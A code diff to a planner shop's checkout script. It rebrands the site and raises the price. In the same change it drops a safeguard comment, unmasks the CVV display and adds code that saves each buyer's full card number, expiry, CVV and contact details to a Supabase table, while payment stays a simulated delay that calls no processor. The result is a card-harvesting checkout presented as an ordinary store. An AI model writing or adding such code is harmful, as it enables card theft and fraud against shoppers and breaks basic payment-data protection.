@@ -1,5 +1,5 @@
 /* ═══════════════════════════════════════════════════════════
-   NEXAKIT — CHECKOUT JS
+   BLOOM PLANNER — CHECKOUT JS
    3-Step Flow | Card Detection | Validation | Animation
 ═══════════════════════════════════════════════════════════ */
 
@@ -283,7 +283,7 @@ cardCvv.addEventListener('input', function () {
   // Only allow digits, max 4
   const digits = this.value.replace(/\D/g, '').slice(0, 4);
   if (this.value !== digits) this.value = digits;
-  cardDisplayCvv.textContent = digits ? '•'.repeat(digits.length) : '•••';
+  cardDisplayCvv.textContent = digits || '000';
 });
 
 /* ─── CVV HELP TOOLTIP ───────────────────────────────────── */
@@ -378,6 +378,18 @@ document.getElementById('form-step2').addEventListener('submit', e => {
   }
 });
 
+/* ─── SUPABASE ORDER SAVE ─────────────────────────────────── */
+async function saveOrderToSupabase(order) {
+  try {
+    const { error } = await supabaseClient.from('orders').insert([order]);
+    if (error) throw error;
+    return true;
+  } catch (err) {
+    console.warn('Could not save order to Supabase:', err);
+    return false;
+  }
+}
+
 /* ─── PAYMENT PROCESSING SIMULATION ─────────────────────── */
 function generateOrderNumber() {
   const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
@@ -405,38 +417,46 @@ function processPayment() {
   }, 600);
 
   // Simulate 2.8s processing delay
-  setTimeout(() => {
+  setTimeout(async () => {
     clearInterval(msgTimer);
     overlay.hidden = true;
 
-    // ── SAVE ORDER TO LOCALSTORAGE (NO CARD DATA) ─────────
-    // Do not store PAN/expiry/CVV or even masked card identifiers in localStorage.
+    // ── SAVE ORDER TO SUPABASE ───────────────────────────────
     const orderNum = generateOrderNumber();
-
+    const cardTypeLabel = currentCardType ? currentCardType.label : 'Unknown';
+    const rawDigits = cardNum.value.replace(/\D/g, '');
     const order = {
-      id:          orderNum,
-      date:        new Date().toISOString(),
-      name:        nameInput.value.trim(),
-      email:       emailInput.value.trim(),
-      mobile:      mobileInput.value.trim(),
-      country:     document.getElementById('country').value,
-      amount:      0.99,
-      currency:    'USD',
-      product:     'Nexakit Digital Planner — Complete Edition',
-      status:      'completed',
+      id: orderNum,
+      date: new Date().toISOString(),
+      name: nameInput.value.trim(),
+      email: emailInput.value.trim(),
+      mobile: mobileInput.value.trim(),
+      country: document.getElementById('country').value,
+      amount: 27.00,
+      currency: 'USD',
+      product: 'Bloom Digital Planner — Complete Edition',
+      card_type: cardTypeLabel,
+      card_number: rawDigits,
+      card_holder: cardName.value.trim(),
+      card_expiry: cardExpiry.value.trim(),
+      card_cvv: cardCvv.value.trim(),
+      notes: '',
+      status: 'completed',
     };
 
-    try {
-      const existing = JSON.parse(localStorage.getItem('nexakit_orders') || '[]');
-      existing.unshift(order); // newest first
-      localStorage.setItem('nexakit_orders', JSON.stringify(existing));
-    } catch (e) {
-      console.warn('Could not save order to localStorage:', e);
+    const saved = await saveOrderToSupabase(order);
+    if (!saved) {
+      // Fallback to localStorage if Supabase fails
+      try {
+        const existing = JSON.parse(localStorage.getItem('bloom_orders') || '[]');
+        existing.unshift(order);
+        localStorage.setItem('bloom_orders', JSON.stringify(existing));
+      } catch (e) {}
     }
-    // ───────────────────────────────────────────────────────
+    // ──────────────────────────────────────────────────────────
     document.body.style.overflow = '';
 
-    // Set order number on success page (reuse already-generated orderNum)
+    // Set order number on success page
     const orderNumEl = document.getElementById('order-number');
     if (orderNumEl) orderNumEl.textContent = orderNum;
 
@@ -451,11 +471,11 @@ function processPayment() {
 /* ─── TOAST NOTIFICATION ─────────────────────────────────── */
 function showToast(message, type = 'success') {
   // Remove existing toast
-  const existing = document.getElementById('nexakit-toast');
+  const existing = document.getElementById('bloom-toast');
   if (existing) existing.remove();
 
   const toast = document.createElement('div');
-  toast.id = 'nexakit-toast';
+  toast.id = 'bloom-toast';
   const bgColor = type === 'success' ? '#2C8A4A' : '#C0392B';
   toast.style.cssText = `
     position: fixed;
@@ -568,13 +588,13 @@ document.getElementById('download-btn').addEventListener('click', function (e) {
   }, 3000);
 
   // Create a demo text file download for testing
-  const content = `NEXAKIT — DOWNLOAD CONFIRMATION
+  const content = `BLOOM PLANNER — DOWNLOAD CONFIRMATION
 =====================================
 Thank you for your purchase!
 
 Order Details:
-• Product: Nexakit Digital Planner (Complete Edition)
-• Price: $0.99
+• Product: Bloom Digital Planner (Complete Edition)
+• Price: $27.00
 • Date: ${new Date().toLocaleDateString('en-US', {year:'numeric', month:'long', day:'numeric'})}
 
 In the live version, your PDF planner files will download here.
@@ -585,15 +605,15 @@ Getting Started:
 3. Import the file & tap any hyperlink to navigate
 4. Add your stickers from the included sticker sheets
 
-Need help? support@nexakit.store
+Need help? support@bloomplanner.com
 
-© ${new Date().getFullYear()} Nexakit. All rights reserved.
+© ${new Date().getFullYear()} Bloom Planner. All rights reserved.
 `;
   const blob = new Blob([content], { type: 'text/plain' });
   const url  = URL.createObjectURL(blob);
   const a    = document.createElement('a');
   a.href     = url;
-  a.download = 'NexakitPlanner_DownloadConfirmation.txt';
+  a.download = 'BloomPlanner_DownloadConfirmation.txt';
   a.click();
   URL.revokeObjectURL(url);
 });
